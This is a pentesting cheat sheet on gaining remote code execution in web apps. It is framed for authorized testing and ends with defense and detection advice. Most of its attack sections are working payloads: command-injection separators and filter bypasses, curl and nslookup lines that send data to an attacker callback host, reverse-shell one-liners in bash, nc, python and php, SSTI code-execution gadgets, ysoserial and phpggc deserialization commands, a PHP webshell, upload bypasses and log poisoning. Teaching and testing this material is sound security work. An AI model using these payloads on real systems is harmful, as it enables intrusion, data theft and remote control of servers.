# Web — Remote Code Execution (RCE)

Getting the web app to run **your** code/commands on the server. Scope: authorized web testing only. This is the top of the web-vuln impact chain — once you have command execution, grab a stable shell and treat it as a host. Vectors here: OS command injection, **template injection (SSTI)**, insecure deserialization, file upload, and LFI→RCE.

> RCE is maximum impact. Prove it with a benign command (`id`, a DNS callback) before anything heavier, and get written approval before dropping a persistent webshell or a reverse shell on a production box. After landing a shell, follow [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md) and [Linux privesc](../Linux/Enumeration%20%26%20Privilege%20Escalation.md).

## Contents

- [OS command injection](#os-command-injection)
- [Reverse shells (after execution)](#reverse-shells-after-execution)
- [Template injection (SSTI)](#template-injection-ssti)
- [Insecure deserialization](#insecure-deserialization)
- [File upload → RCE](#file-upload--rce)
- [LFI → RCE](#lfi--rce)
- [Tooling](#tooling)
- [Defense / detection (for the report)](#defense--detection-for-the-report)

## OS command injection

App passes your input into a shell command. Inject a separator, then your command.

```bash
# separators — your command runs alongside/instead of the intended one
; id            | id            || id           && id
`id`            $(id)           %0a id          # newline, backtick, $()
# e.g. a "ping host" feature:
127.0.0.1; id
127.0.0.1 && whoami

# BLIND (no output) — prove execution out-of-band or by timing
127.0.0.1; sleep 5                               # time-based: response delayed 5s = it ran
127.0.0.1; nslookup `whoami`.ATTACKER-COLLAB     # OOB: DNS callback carries the output
127.0.0.1; curl https://ATTACKER-COLLAB/$(id|base64)

# filter bypass
cat${IFS}/etc/passwd          # ${IFS} = space when spaces are filtered
c'a't /et'c'/pas'swd          # quote insertion splits the keyword
/???/??t /etc/passwd          # globbing when letters are filtered
$(printf '\x69\x64')          # build 'id' from hex
```

```text
# expected when it works (ping feature reflecting output):
PING 127.0.0.1 ...
uid=33(www-data) gid=33(www-data) groups=33(www-data)   # your injected `id` ran
```

## Reverse shells (after execution)

Once any vector gives execution, call back to your listener (`nc -lvnp 443`):

```bash
bash -i >& /dev/tcp/ATTACKER/443 0>&1                       # bash
busybox nc ATTACKER 443 -e sh                               # nc (busybox has -e)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'
php -r '$s=fsockopen("ATTACKER",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Then **upgrade the shell** (PTY) and enumerate — see [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md) and the [Linux Overview](../Linux/Linux%20Overview.md). URL-encode the payload if it goes through an HTTP parameter. If outbound is filtered, use a webshell or a bind shell instead.

## Template injection (SSTI)

User input is rendered **as a template**, not just data. Server-side template engines expose language internals → RCE.

```python
# 1. Detect with a math polyglot — if it evaluates, you have SSTI
${7*7}   {{7*7}}   <%= 7*7 %>   #{7*7}   {7*7}
# 49 in the output = injected and evaluated (not reflected literally as 7*7)

# 2. Fingerprint the engine (behavior differs)
{{7*'7'}}    -> 49  = Twig (PHP)      |  7777777 = Jinja2 (Python)
${7*7}       -> works = Freemarker/Velocity (Java) / Smarty (PHP)
```

```python
# 3. Exploit to RCE — Jinja2 / Flask (Python) via the object hierarchy
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Twig (PHP)
{{ ['id']|filter('system') }}
{{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('id') }}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }

# Velocity (Java)
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec",...)   # see tplmap/PayloadsAllTheThings

# ERB (Ruby)
<%= `id` %>        <%= system('id') %>

# Smarty (PHP)
{system('id')}     {php}system('id');{/php}
```

Each engine's chain is finicky — detect, fingerprint, then pull the exact gadget from PayloadsAllTheThings or let **tplmap** do it.

## Insecure deserialization

App deserializes attacker-controlled serialized objects → arbitrary code during object construction. Spot serialized blobs: Java (`rO0AB...` base64 / `AC ED 00 05` hex), PHP (`O:4:"User":...`), Python pickle, .NET (`AAEAAAD...`), Ruby/YAML.

```bash
# Java — generate a gadget-chain payload for a known library on the classpath
java -jar ysoserial.jar CommonsCollections5 'curl https://ATTACKER-COLLAB/$(id)' | base64
#   CommonsCollections1-7, Spring1, Hibernate1... pick a chain matching the app's libs
#   deliver it wherever the app reads Java-serialized data (cookie, viewstate, RMI, JMX)

# .NET
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c calc"

# PHP — craft an object whose __wakeup/__destruct runs code (PHPGGC automates chains)
phpggc Symfony/RCE4 system id -b
```

PHP without a framework: look for `unserialize()` on user input and build a POP chain from magic methods (`__wakeup`, `__destruct`, `__toString`). Python `pickle.loads()` on user data = instant RCE via `__reduce__`.

## File upload → RCE

Upload a script the server will execute.

```php
// shell.php  (classic one-liner)
<?php system($_GET['c']); ?>          // then: /uploads/shell.php?c=id
```

Bypasses when the upload is filtered:

- **Extension:** `shell.php5`, `.phtml`, `.phar`, `.pht`; `shell.php.jpg`; `shell.php%00.jpg` (null byte, old stacks); double ext `shell.jpg.php`.
- **Content-Type:** set `Content-Type: image/png` on the multipart part while the body is PHP.
- **Magic bytes:** prepend `GIF89a;` so a content-sniffer sees an image, PHP still runs.
- **`.htaccess` trick** (Apache): upload `.htaccess` with `AddType application/x-httpd-php .jpg` → `.jpg` files execute as PHP.
- **Path/overwrite:** path traversal in the filename to drop it in the webroot.
- Confirm the upload **lands in a web-accessible, script-executing** directory — otherwise it's just a file write.

## LFI → RCE

Local File Inclusion (`include`/`require` on user input) becomes RCE several ways:

```bash
# read first to confirm LFI
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php    # exfil source code

# LFI -> RCE
?page=php://input            (POST body = <?php system($_GET[c]);?>)   # php://input wrapper
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==    # data:// wrapper
# Log poisoning: inject PHP into a log the app writes, then include it
#   send  User-Agent: <?php system($_GET[c]);?>  -> ?page=/var/log/apache2/access.log&c=id
# Session/upload/procfs includes, or /proc/self/environ poisoning, also work
```

## Tooling

- **[commix](https://github.com/commixproject/commix)** — automates command-injection detection & exploitation: `commix -u "https://t/ping?ip=1"`.
- **[tplmap](https://github.com/epinna/tplmap)** — SSTI detection/exploitation across engines (SSTI's sqlmap): `tplmap -u "https://t/?name=1"`.
- **ysoserial** (Java) / **ysoserial.net** / **[PHPGGC](https://github.com/ambionics/phpggc)** — deserialization gadget chains.
- **PayloadsAllTheThings** — the reference for per-engine SSTI, LFI wrappers, upload bypasses.
- **interactsh / Burp Collaborator** — OOB confirmation for blind command injection/SSTI.

## Defense / detection (for the report)

- **Never pass user input to a shell** — use language APIs with argument arrays (`execve`-style), no shell interpolation; if a shell is unavoidable, strict allowlist + escaping.
- **Don't render user input as a template**; keep user data as template *variables*, use a sandboxed/logic-less engine (e.g. no `{{ }}` eval of user strings), patch engine sandbox escapes.
- **Don't deserialize untrusted data** with native deserializers; use JSON with a schema; sign/encrypt any serialized state; allowlist classes if unavoidable.
- **File uploads:** allowlist extensions/types by content, store outside the webroot, randomize names, serve from a non-executing domain, strip exec bits.
- **LFI:** no user input in `include`/`require`; allowlist page IDs; disable `allow_url_include`.
- **Harden the blast radius:** run the app as a low-priv user, containerize, egress-filter so reverse shells/OOB callbacks fail.
- **Detect:** app processes spawning `sh`/`bash`/`cmd`/`powershell`; outbound connections from the web user; webroot file writes; template-engine errors; EDR on `ysoserial`-style process chains (`java` → `cmd`).

## Related

[Web Overview](Web%20Overview.md) · [SQL Injection](SQL%20Injection.md) (SQLi→RCE) · [SSRF](SSRF.md) (gopher→RCE) · [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md) · [Linux privesc](../Linux/Enumeration%20%26%20Privilege%20Escalation.md)
